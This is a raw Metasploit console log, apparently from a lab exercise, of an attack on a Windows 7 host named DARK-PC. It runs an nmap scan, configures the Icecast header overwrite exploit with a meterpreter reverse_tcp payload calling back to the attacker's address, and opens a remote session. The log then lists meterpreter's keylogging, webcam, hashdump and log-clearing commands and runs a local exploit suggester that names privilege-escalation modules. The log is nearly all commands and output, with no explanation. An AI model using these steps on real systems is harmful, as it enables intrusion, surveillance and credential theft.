@@ -1,0 +1,544 @@
+msf6 > db_nmap -sV 10.10.9.203
+[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 02:35 PKT
+[*] Nmap: Nmap scan report for 10.10.9.203
+[*] Nmap: Host is up (0.44s latency).
+[*] Nmap: Not shown: 987 closed ports
+[*] Nmap: PORT      STATE    SERVICE            VERSION
+[*] Nmap: 135/tcp   open     msrpc              Microsoft Windows RPC
+[*] Nmap: 139/tcp   open     netbios-ssn        Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp   open     microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+[*] Nmap: 3001/tcp  filtered nessus
+[*] Nmap: 3389/tcp  open     ssl/ms-wbt-server?
+[*] Nmap: 5357/tcp  open     http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[*] Nmap: 8000/tcp  open     http               Icecast streaming media server
+[*] Nmap: 49152/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49153/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49154/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49158/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49159/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: 49160/tcp open     msrpc              Microsoft Windows RPC
+[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 127.13 seconds
+msf6 > hosts
+
+Hosts
+=====
+
+address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------      ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.9.203             Unknown                    device
+
+msf6 > services
+Services
+========
+
+host         port   proto  name               state     info
+----         ----   -----  ----               -----     ----
+10.10.9.203  135    tcp    msrpc              open      Microsoft Windows RPC
+10.10.9.203  139    tcp    netbios-ssn        open      Microsoft Windows netbios-ssn
+10.10.9.203  445    tcp    microsoft-ds       open      Microsoft Windows 7 - 10 microso
+                                                        ft-ds workgroup: WORKGROUP
+10.10.9.203  3001   tcp    nessus             filtered
+10.10.9.203  3389   tcp    ssl/ms-wbt-server  open
+10.10.9.203  5357   tcp    http               open      Microsoft HTTPAPI httpd 2.0 SSDP
+                                                        /UPnP
+10.10.9.203  8000   tcp    http               open      Icecast streaming media server
+10.10.9.203  49152  tcp    msrpc              open      Microsoft Windows RPC
+10.10.9.203  49153  tcp    msrpc              open      Microsoft Windows RPC
+10.10.9.203  49154  tcp    msrpc              open      Microsoft Windows RPC
+10.10.9.203  49158  tcp    msrpc              open      Microsoft Windows RPC
+10.10.9.203  49159  tcp    msrpc              open      Microsoft Windows RPC
+10.10.9.203  49160  tcp    msrpc              open      Microsoft Windows RPC
+
+msf6 > vulns
+
+Vulnerabilities
+===============
+
+Timestamp  Host  Name  References
+---------  ----  ----  ----------
+
+msf6 > use icecast
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
+
+[*] Using exploit/windows/http/icecast_header
+msf6 exploit(windows/http/icecast_header) > search multi/handler
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
+   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
+   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
+   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
+   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
+   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
+   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
+   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
+   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
+
+
+Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence
+
+msf6 exploit(windows/http/icecast_header) > use 5
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > ip addr
+[*] exec: ip addr
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000
+    link/ether 00:25:64:87:14:c4 brd ff:ff:ff:ff:ff:ff
+4: wlx7c8bca17af9f: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 7c:8b:ca:17:af:9f brd ff:ff:ff:ff:ff:ff
+    inet 192.168.0.111/24 brd 192.168.0.255 scope global dynamic noprefixroute wlx7c8bca17af9f
+       valid_lft 4876sec preferred_lft 4876sec
+    inet6 fe80::d075:fa9e:673:c61c/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
+    link/none 
+    inet 10.4.27.78/17 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::72c6:99b6:73b6:75ad/64 scope link stable-privacy 
+       valid_lft forever preferred_lft forever
+msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.4.27.78
+LHOST => 10.4.27.78
+msf6 exploit(multi/handler) > use icecast
+[*] Using configured payload windows/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
+
+[*] Using exploit/windows/http/icecast_header
+msf6 exploit(windows/http/icecast_header) > options
+
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identif
+                                      ier, or hosts file with syntax 'file:<
+                                      path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, t
+                                        hread, process, none)
+   LHOST     192.168.0.111    yes       The listen address (an interface may
+                                         be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/icecast_header) > set LHOST 10.4.27.78
+LHOST => 10.4.27.78
+msf6 exploit(windows/http/icecast_header) > options
+
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identif
+                                      ier, or hosts file with syntax 'file:<
+                                      path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, t
+                                        hread, process, none)
+   LHOST     10.4.27.78       yes       The listen address (an interface may
+                                         be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.65.52
+RHOSTS => 10.10.65.52
+msf6 exploit(windows/http/icecast_header) > options
+
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.65.52      yes       The target host(s), range CIDR identif
+                                      ier, or hosts file with syntax 'file:<
+                                      path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, t
+                                        hread, process, none)
+   LHOST     10.4.27.78       yes       The listen address (an interface may
+                                         be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/icecast_header) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.4.27.78:4444 
+msf6 exploit(windows/http/icecast_header) > [*] Sending stage (175174 bytes) to 10.10.65.52
+[*] Meterpreter session 1 opened (10.4.27.78:4444 -> 10.10.65.52:49217) at 2021-08-15 05:32:57 +0500
+
+msf6 exploit(windows/http/icecast_header) > 
+msf6 exploit(windows/http/icecast_header) > jobs
+
+Jobs
+====
+
+No active jobs.
+
+msf6 exploit(windows/http/icecast_header) > jobs
+
+Jobs
+====
+
+No active jobs.
+
+msf6 exploit(windows/http/icecast_header) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.4.27.78:4444 -> 10.10.15
+                                                             7.68:49183 (10.10.157.68)
+
+msf6 exploit(windows/http/icecast_header) > session -i 1
+[-] Unknown command: session
+msf6 exploit(windows/http/icecast_header) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: Dark-PC\Dark
+meterpreter > sysinfo
+Computer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session
+    ssl_verify                Modify the SSL certificate verification setting
+    transport                 Manage the transport mechanisms
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+meterpreter > ifconfig 
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 12
+============
+Name         : Microsoft ISATAP Adapter
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::5efe:a0a:9d44
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 13
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 02:c3:ea:4a:5b:59
+MTU          : 9001
+IPv4 Address : 10.10.157.68
+IPv4 Netmask : 255.255.0.0
+IPv6 Address : fe80::10ad:8b67:6cec:c19a
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+meterpreter > ipconfig 
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 12
+============
+Name         : Microsoft ISATAP Adapter
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::5efe:a0a:9d44
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 13
+============
+Name         : AWS PV Network Device #0
+Hardware MAC : 02:c3:ea:4a:5b:59
+MTU          : 9001
+IPv4 Address : 10.10.157.68
+IPv4 Netmask : 255.255.0.0
+IPv6 Address : fe80::10ad:8b67:6cec:c19a
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+meterpreter > run post/windows/gather/checkvm 
+
+[*] Checking if the target is a Virtual Machine ...
+[+] This is a Xen Virtual Machine
+meterpreter > run post/multi/recon/local_exploit_suggester 
+
+[*] 10.10.157.68 - Collecting local exploits for x86/windows...
+[*] 10.10.157.68 - 38 exploit checks are being tried...
+[+] 10.10.157.68 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[+] 10.10.157.68 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
+meterpreter > 
+
+
